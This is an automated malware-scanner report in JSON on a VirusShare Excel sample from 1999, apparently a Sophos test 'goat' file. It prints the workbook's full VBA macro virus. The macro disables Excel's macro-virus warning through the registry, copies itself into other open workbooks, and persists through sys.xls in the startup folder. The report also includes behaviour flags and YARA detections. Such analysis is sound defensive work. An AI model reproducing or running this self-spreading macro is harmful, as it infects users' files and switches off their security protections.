{
    "docinfo": {
        "attributes": [
            "Attribute VB_Name = \"Sheet1\"",
            "Attribute VB_Base = \"0{00020820-0000-0000-C000-000000000046}\"",
            "Attribute VB_Creatable = False",
            "Attribute VB_PredeclaredId = True",
            "Attribute VB_Exposed = True",
            "Attribute VB_TemplateDerived = False",
            "Attribute VB_Customizable = True",
            "Attribute VB_Name = \"Sheet2\"",
            "Attribute VB_Base = \"0{00020820-0000-0000-C000-000000000046}\"",
            "Attribute VB_Creatable = False",
            "Attribute VB_PredeclaredId = True",
            "Attribute VB_Exposed = True",
            "Attribute VB_TemplateDerived = False",
            "Attribute VB_Customizable = True",
            "Attribute VB_Name = \"Sheet3\"",
            "Attribute VB_Base = \"0{00020820-0000-0000-C000-000000000046}\"",
            "Attribute VB_Creatable = False",
            "Attribute VB_PredeclaredId = True",
            "Attribute VB_Exposed = True",
            "Attribute VB_TemplateDerived = False",
            "Attribute VB_Customizable = True",
            "Attribute VB_Name = \"Sheet4\"",
            "Attribute VB_Base = \"0{00020820-0000-0000-C000-000000000046}\"",
            "Attribute VB_Creatable = False",
            "Attribute VB_PredeclaredId = True",
            "Attribute VB_Exposed = True",
            "Attribute VB_TemplateDerived = False",
            "Attribute VB_Customizable = True",
            "Attribute VB_Name = \"Sheet5\"",
            "Attribute VB_Base = \"0{00020820-0000-0000-C000-000000000046}\"",
            "Attribute VB_Creatable = False",
            "Attribute VB_PredeclaredId = True",
            "Attribute VB_Exposed = True",
            "Attribute VB_TemplateDerived = False",
            "Attribute VB_Customizable = True",
            "Attribute VB_Name = \"Sheet6\"",
            "Attribute VB_Base = \"0{00020820-0000-0000-C000-000000000046}\"",
            "Attribute VB_Creatable = False",
            "Attribute VB_PredeclaredId = True",
            "Attribute VB_Exposed = True",
            "Attribute VB_TemplateDerived = False",
            "Attribute VB_Customizable = True"
        ],
        "behavior": {
            "ActiveWorkbook.SaveAs": "May save the current workbook",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "CodeModule": "May attempt to modify the VBA code",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Lib": "May run code from a DLL",
            "RegCloseKey": "May read or write registry keys",
            "RegOpenKeyExA": "May read or write registry keys",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code",
            "Workbook_Activate": "Runs when the Excel Workbook is opened",
            "Workbook_Open": "Runs when the Excel Workbook is opened"
        },
        "macro": "Option Compare Text 'FRIEND\nPrivate Declare Function RegOpenKeyExA Lib \"advapi32.dll\" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long\nPrivate Declare Function RegSetValueExA Lib \"advapi32.dll\" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long\nPrivate Declare Function RegCloseKey Lib \"advapi32.dll\" (ByVal hKey As Long) As Long\nConst HKEY_CURRENT_USER = &H80000001\nConst KEY_ALL_ACCESS = &H3F\nConst lngData As Long = 0\nConst REG_DWORD As Long = 4\nPrivate Sub Workbook_Activate()\nInfect\nEnd Sub\nFunction Infect()\nOn Error GoTo xnctsg\nApplication.ThisWorkbook.VBProject.VBComponents(\"ThisWorkbook\").Export \"c:\\office.sys\"\nFor Each yactgf In VBProject.VBE.VBProjects\nxcctsg = yactgf.VBComponents.Count\nFor Each xcctxg In yactgf.VBComponents\nyactxg = xcctxg.Name\nIf yactxg = \"ThisWorkbook\" Then\nIf yactgf.VBComponents(yactxg).CodeModule.CountOfLines <= 1 Then\nyactgf.VBComponents(yactxg).CodeModule.AddFromFile \"c:\\office.sys\"\nWith yactgf.VBComponents(yactxg).CodeModule\nFor asjjh = 1 To 4\n.DeleteLines 1\nNext asjjh\nEnd With\nEnd If\nEnd If\nNext xcctxg\n5 Next yactgf\nExit Function\nxnctsg:\nIf Err.Number = 50289 Then\nErr.Clear\nResume 5\nEnd If\nEnd Function\nPrivate Sub Workbook_Open()\nu = RegOpenKeyExA(HKEY_CURRENT_USER, \"Software\\Microsoft\\Office\\8.0\\Excel\\Microsoft Excel\", 0&, KEY_ALL_ACCESS, k)\nu = RegSetValueExA(k, \"Options6\", 0&, REG_DWORD, lngData, 4)\nu = RegCloseKey(k)\nApplication.DisplayAlerts = False\nApplication.ScreenUpdating = False\nFor Each wbxxc In Workbooks\nIf wbxxc.Name = \"sys.xls\" And ThisWorkbook.Name <> \"sys.xls\" Then\nApplication.DisplayAlerts = True\nApplication.ScreenUpdating = True\nExit Sub\nEnd If\nIf wbxxc.Name = \"sys.xls\" And ThisWorkbook.Name = \"sys.xls\" Then GoTo 99\nNext wbxxc\nApplication.Workbooks.Add\nActiveWorkbook.SaveAs (Application.StartupPath & \"\\sys.xls\")\nActiveWindow.Visible = True\n99 On Error GoTo xnctsg\nIf ThisWorkbook.Name = \"sys.xls\" Then\nApplication.Workbooks.Add\nEnd If\nApplication.ThisWorkbook.VBProject.VBComponents(\"ThisWorkbook\").Export \"c:\\office.sys\"\nFor Each yactgf In VBProject.VBE.VBProjects\nxcctsg = yactgf.VBComponents.Count\nFor Each xcctxg In yactgf.VBComponents\nyactxg = xcctxg.Name\nIf yactxg = \"ThisWorkbook\" Then\nIf yactgf.VBComponents(yactxg).CodeModule.CountOfLines <= 1 Then\nyactgf.VBComponents(yactxg).CodeModule.AddFromFile \"c:\\office.sys\"\nWith yactgf.VBComponents(yactxg).CodeModule\nFor asjjh = 1 To 4\n.DeleteLines 1\nNext asjjh\nEnd With\nEnd If\nEnd If\nNext xcctxg\n5 Next yactgf\nApplication.Workbooks(\"sys.xls\").Close savechanges:=True\nApplication.DisplayAlerts = True\nApplication.ScreenUpdating = True\nExit Sub\nxnctsg:\nIf Err.Number = 50289 Then\nErr.Clear\nResume 5\nEnd If\nEnd Sub\nPrivate Sub Workbook_BeforeClose(Cancel As Boolean)\nu = RegOpenKeyExA(HKEY_CURRENT_USER, \"Software\\Microsoft\\Office\\8.0\\Excel\\Microsoft Excel\", 0&, KEY_ALL_ACCESS, k)\nu = RegSetValueExA(k, \"Options6\", 0&, REG_DWORD, lngData, 4)\nu = RegCloseKey(k)\nIf ThisWorkbook.Name = \"sys.xls\" Then Exit Sub\nInfect\nEnd Sub\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"
    },
    "filename": "VirusShare_32d63609263f3e1371d2e9da3b42a7cb",
    "filesize": 57856,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: 1252, Author: Ditry PC, Last Saved By: Ditry PC, Name of Creating Application: Microsoft Excel, Create Time/Date: Mon Feb  8 09:24:15 1999, Security: 0",
    "hashes": {
        "md5": "32d63609263f3e1371d2e9da3b42a7cb",
        "sha1": "fbbd9068fb7d65ee3bb7fa936ec13eb9518bd8b5",
        "sha256": "fde0dc509db9ccae89466adf4030df690ac4448663f2be7804325472d26129be"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "Ditry PC                                                                                                     B",
            "ThisWorkbook",
            " :!8",
            "\"$\"#,##0_);\\(\"$\"#,##0\\)",
            "\"$\"#,##0_);[Red]\\(\"$\"#,##0\\)",
            "\"$\"#,##0.00_);\\(\"$\"#,##0.00\\)",
            "\"$\"#,##0.00_);[Red]\\(\"$\"#,##0.00\\)",
            "_(\"$\"* #,##0_);_(\"$\"* \\(#,##0\\);_(\"$\"* \"-\"_);_(@_)",
            "_(* #,##0_);_(* \\(#,##0\\);_(* \"-\"_);_(@_)",
            "_(\"$\"* #,##0.00_);_(\"$\"* \\(#,##0.00\\);_(\"$\"* \"-\"??_);_(@_)",
            "_(* #,##0.00_);_(* \\(#,##0.00\\);_(* \"-\"??_);_(@_)",
            "Sheet1",
            "Sheet2",
            "Sheet3",
            "Sophos 1",
            "Sophos 2",
            "Sophos 3",
            "Sophos Goat File",
            "Ir0;",
            "02CV",
            "ZT0_T0=l",
            "NJT0",
            "0YT0",
            "YT0L",
            "NJT0rb",
            "MbP?_",
            "Page &P",
            "MSUDN",
            "HP LaserJet 4",
            "Sheet1",
            "MbP?_",
            "Page &P",
            "Sheet2",
            "MbP?_",
            "Page &P",
            "Sheet3",
            "MbP?_",
            "Page &P",
            "Sheet4",
            "MbP?_",
            "Page &P",
            "Sheet5",
            "MbP?_",
            "Page &P",
            "Sheet6",
            "PbDf",
            "FlSt",
            "RegOpenKeyExA",
            "RegSetValueExA",
            "RegCloseKey",
            "\u0650\t6\u04f5&",
            "\u0650\t6\u04f5&",
            "\u0650\t6\u04f5&U9",
            "\u0650\t6\u04f5&",
            "FRIEND",
            "c:\\office.sys",
            "ThisWorkbook ",
            "ThisWorkbook",
            "c:\\office.sys",
            "Software\\Microsoft\\Office\\8.0\\Excel\\Microsoft Excel",
            "Options6",
            "sys.xls",
            "sys.xls",
            "sys.xls",
            "sys.xls",
            "\\sys.xls",
            "sys.xls",
            "c:\\office.sys",
            "ThisWorkbook ",
            "ThisWorkbook",
            "c:\\office.sys",
            "sys.xls",
            "Software\\Microsoft\\Office\\8.0\\Excel\\Microsoft Excel",
            "Options6",
            "sys.xls",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sWorkboo",
            "0{00020P819-",
            "$0046}",
            "|Creatabl",
            "False",
            "Predecla",
            "\"@Expose",
            "emplateD0eriv",
            "eCustomiz",
            "Option C",
            "? Tex",
            "t 'FRIEN0D",
            "+ DA",
            "N Func",
            "egOpenKe",
            "yExA Lib",
            " \"advapi",
            "32.dll\" ",
            "(ByVa",
            " As @Long, \tlpSub",
            "ulIs",
            "samDesi",
            ")phkResu4lt",
            "`Set'uet0",
            "1@$erbL>dwPType",
            "(,IlpD",
            "AnyEHcb",
            "9d4Cl",
            "Const",
            " HKEY_CU",
            "RRENT_USDER@&H8C1",
            "\tALL_@ACCESS",
            "lng.@",
            "REG_DWOlRD",
            " )E_A@v",
            "Infect@",
            "End ",
            "On E",
            "rror GoTHo x",
            "sgpplica",
            ".\t.VBProj",
            "_onents",
            "().nrt ",
            "\"c:\\offi@ce.sys{F",
            "Each yactgf In@",
            "xcpctsg`",
            ".pCoun@",
            " Then",
            "de@Module",
            "fLines <8= 1$",
            "ddFromFi\u301d&Wit%&",
            "`<@,asjjh",
            "o  E.Delete",
            "xint@5F:",
            "&I.@Number ",
            "500289D!",
            "Cl`ear",
            "aTST[AAVu",
            "*(o\"\"Sof",
            "tw\\Micr$os",
            "\\OQ\\8",
            ".0\\Excel",
            "\", 0&",
            "u, k",
            "H(k, \"",
            "u, z, 4",
            "mDis",
            "yAlerts",
            "ScreenUpd@snAcd",
            "`wbxxc`",
            "qhIf ",
            "`q.xls\" A",
            "<> G",
            "E1#rH",
            "&\tys\t",
            "\tCK99",
            ".PSavef(",
            "tartupPa07& \"\\",
            "eWindow.0Visi",
            "99 TT@",
            "_Y_Y\"_Y_Y_Y",
            "G_Y_Ys`SP3Hb^C_YRc_Y_Y_Y_YpDhIxg_Y_Y`_Yct",
            "_Yl_Y",
            "a_Y_Y4,_Y0:_Yqxpz\\Y\t\"6$(<",
            "\t s`/changes:=+",
            ">s` `}` ",
            "WB eforeT(Can\\BooenV\u01f6/b/b/bE/bel/b/blR/b, /b/b",
            "\"bC\u05dfCk",
            "xtplX",
            "Qp[D",
            "xtr@",
            "]10\\",
            "l\"Yd?",
            "h4lh",
            "qP<ldiTllPi0@/h",
            "h4lh",
            "qP<lPiT@/h",
            "qd<ldiT@",
            "Attribut",
            "e VB_Nam",
            "e = \"She@et1\"",
            "t0{00020820-",
            "$0046",
            "|Creata",
            "False",
            "Predecl",
            "\"Expose",
            "Template`Deriv",
            "eCustomiz",
            "ExSt",
            "Attribut",
            "e VB_Nam",
            "e = \"She@et2\"",
            "t0{00020820-",
            "$0046",
            "|Creata",
            "False",
            "Predecl",
            "\"Expose",
            "Template`Deriv",
            "eCustomiz",
            "Attribut",
            "e VB_Nam",
            "e = \"She@et3\"",
            "t0{00020820-",
            "$0046",
            "|Creata",
            "False",
            "Predecl",
            "\"Expose",
            "Template`Deriv",
            "eCustomiz",
            "Attribut",
            "e VB_Nam",
            "e = \"She@et4\"",
            "t0{00020820-",
            "$0046",
            "|Creata",
            "False",
            "Predecl",
            "\"Expose",
            "Template`Deriv",
            "eCustomiz",
            "Attribut",
            "e VB_Nam",
            "e = \"She@et5\"",
            "t0{00020820-",
            "$0046",
            "|Creata",
            "False",
            "Predecl",
            "\"Expose",
            "Template`Deriv",
            "eCustomiz",
            "Attribut",
            "e VB_Nam",
            "e = \"She@et6\"",
            "t0{00020820-",
            "$0046",
            "|Creata",
            "False",
            "Predecl",
            "\"Expose",
            "Template`Deriv",
            "eCustomiz",
            "VBAProject",
            "rstdole>",
            "*\\G{00020430-",
            "6}#2.0#0",
            "#C:\\WIND",
            "OWS\\SYST",
            "EM\\STDOLE",
            "Close~;",
            "_B_var_k",
            "_B_var_u",
            "Itemz",
            "_B_var_yactgf",
            "_B_var_xcctsgH",
            "_B_var_xcctxg",
            "_B_var_yactxg",
            "_B_var_asjjh",
            "2.TLB#",
            " Automat",
            "MSForms",
            "F9D 8655CCD3",
            "9-11D3-A",
            "CD9-900936D3B52",
            "3.TWD#Mi",
            "crosoft E",
            "` Ob",
            " Library",
            "P3-0*PJP\\VBE\\(EX(",
            "ACxOfficDxO@uf",
            ",,2DF8D",
            "04C-5BFA",
            "-101B-BDE5@xAA@w4",
            "2HxPROGRA",
            "M FILES\\",
            "MICROSOF",
            "T OFFICE",
            "MSO97.",
            "DLLHZ# 8.0Z",
            "BThis",
            "Workbook\"",
            "\"h@6s",
            "Sheet1",
            "e@Pt",
            "\u0650\t6\u04f5&",
            "SAMPLE1",
            "VBAProject",
            "ThisWorkbook",
            "Sheet1",
            "Sheet2",
            "Sheet3",
            "Sheet4",
            "Sheet5",
            "Sheet6",
            "C:\\PROGRAM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA332.DLL",
            "C:\\Program Files\\Microsoft Office\\Office\\EXCEL8.OLB",
            "Excel",
            "C:\\WINDOWS\\SYSTEM\\STDOLE2.TLB",
            "stdole",
            "\u0650\t6\u04f5&",
            "C:\\WINDOWS\\SYSTEM\\MSForms.TWD",
            "MSForms",
            "\u0650\t6\u04f5&",
            "C:\\WINDOWS\\TEMP\\VBE\\MSForms.EXD",
            "C:\\PROGRAM FILES\\MICROSOFT OFFICE\\OFFICE\\MSO97.DLL",
            "Office",
            "\u0650\t6\u04f5&",
            "\u0650\t6\u04f5&",
            "Workbook",
            "RegOpenKeyExA",
            "advapi32.dll",
            "RegOpenKeyExA",
            "RegSetValueExA",
            "RegSetValueExA",
            "RegCloseKey",
            "RegCloseKey",
            "Workbook_Activate",
            "Ina^",
            "1237417ea8",
            "c37417ea8",
            "d37417ea8",
            "e37417ea8",
            "f37417ea8",
            "1037417ea8",
            "1137417ea8",
            "\u0650\t6\u04f5&",
            "\u0650\t6\u04f5&",
            "\u0650\t6\u04f5&",
            "\u0650\t6\u04f5&",
            "\u0650\t6\u04f5&",
            "\u0650\t6\u04f5&",
            "\u0650\t6\u04f5&",
            "Excel+",
            "Win16~",
            "Win32",
            "SAMPLE16",
            "stdole`",
            "MSFormsC",
            "VBAProject",
            "Office",
            "ThisWorkbook|",
            "_Evaluate",
            "Sheet1",
            "Sheet2",
            "Sheet3",
            "Sheet4",
            "Sheet5",
            "Sheet6",
            "Version",
            "CLASS",
            "BEGIN",
            "MultiUse",
            "Workbookk",
            "RegOpenKeyExAL",
            "hKey ",
            "lpSubKey",
            "ulOptions",
            "samDesired(",
            "phkResult4",
            "advapi32.dll}0",
            "RegSetValueExA",
            "lpValueName)",
            "Reserved\\",
            "dwType",
            "lpDatah0",
            "cbDatai",
            "RegCloseKeyl",
            "HKEY_CURRENT_USER\u029d",
            "KEY_ALL_ACCESS<",
            "lngDatar",
            "REG_DWORD",
            "Workbook_Activateg",
            "Infectf",
            "xnctsg",
            "Application*",
            "VBProjectOh",
            "VBComponents",
            "Export",
            "yactgf",
            "VBProjects'",
            "xcctsgw",
            "Count0v",
            "xcctxgXx",
            "yactxg[",
            "CodeModule",
            "CountOfLines!\\",
            "AddFromFileu",
            "asjjh-",
            "DeleteLines",
            "Erro",
            "Number-",
            "Clear",
            "Workbook_Open",
            "DisplayAlerts",
            "ScreenUpdating!",
            "wbxxc",
            "WorkbooksB",
            "99K[",
            "Addr",
            "ActiveWorkbook",
            "SaveAsf;",
            "StartupPathi",
            "ActiveWindow+",
            "Visible",
            "savechangest",
            "Workbook_BeforeClose",
            "Cancel",
            "Activate|",
            "Beforefect",
            "Workbook_Open",
            "Workbook_BeforeClose",
            "DeleteLines",
            "VBA332.DLL",
            "Software\\Microsoft\\Office\\8.0\\Excel\\Microsoft Excel",
            "Options6",
            "sys.xls",
            "c:\\office.sys",
            "ThisWorkbook",
            "VBComponents",
            "Count",
            "Name",
            "CodeModule",
            "CountOfLines",
            "AddFromFile",
            "hKey",
            "lpSubKey",
            "ulOptions",
            "samDesired",
            "phkResult",
            "lpValueName",
            "Reserved",
            "dwType",
            "lpData",
            "cbData",
            "CancelI",
            "ThisWorkbook",
            "Sheet1",
            "Sheet2",
            "Sheet3",
            "Sheet4",
            "Sheet5",
            "Sheet6",
            "ID=\"{9D8655E6-0D39-11D3-ACD9-900936D3B526}\"",
            "Document=ThisWorkbook/&H00000000",
            "Document=Sheet1/&H00000000",
            "Document=Sheet2/&H00000000",
            "Document=Sheet3/&H00000000",
            "Document=Sheet4/&H00000000",
            "Document=Sheet5/&H00000000",
            "Document=Sheet6/&H00000000",
            "Name=\"VBAProject\"",
            "HelpContextID=\"0\"",
            "CMG=\"6F6DA832A83EAA42AA42AA42AA42\"",
            "DPB=\"7577B238BE3FBF3FBF3F\"",
            "GC=\"7B79BC46C347C3473C\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisWorkbook=0, 0, 0, 0, C",
            "Sheet1=0, 0, 0, 0, C",
            "Sheet2=0, 0, 0, 0, C",
            "Sheet3=0, 0, 0, 0, C",
            "Sheet4=0, 0, 0, 0, C",
            "Sheet5=0, 0, 0, 0, C",
            "Sheet6=0, 0, 0, 0, C",
            "Ditry PC",
            "Ditry PC",
            "Microsoft Excel",
            "Sheet1",
            "Sheet2",
            "Sheet3",
            "Sophos 1",
            "Sophos 2",
            "Sophos 3",
            "Worksheets",
            "_PID_GUID",
            "Microsoft Excel Worksheet",
            "Biff8",
            "Excel.Sheet.8"
        ],
        "file": {
            "C:\\PROGRAM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA332.DLL": "Library",
            "C:\\PROGRAM FILES\\MICROSOFT OFFICE\\OFFICE\\MSO97.DLL": "Library",
            "C:\\Program Files\\Microsoft Office\\Office\\EXCEL8.OLB": "Autogen",
            "VBA332.DLL": "Library",
            "\\sys.xls": "Excel",
            "advapi32.dll": "Library",
            "sys.xls": "Excel"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.311143",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
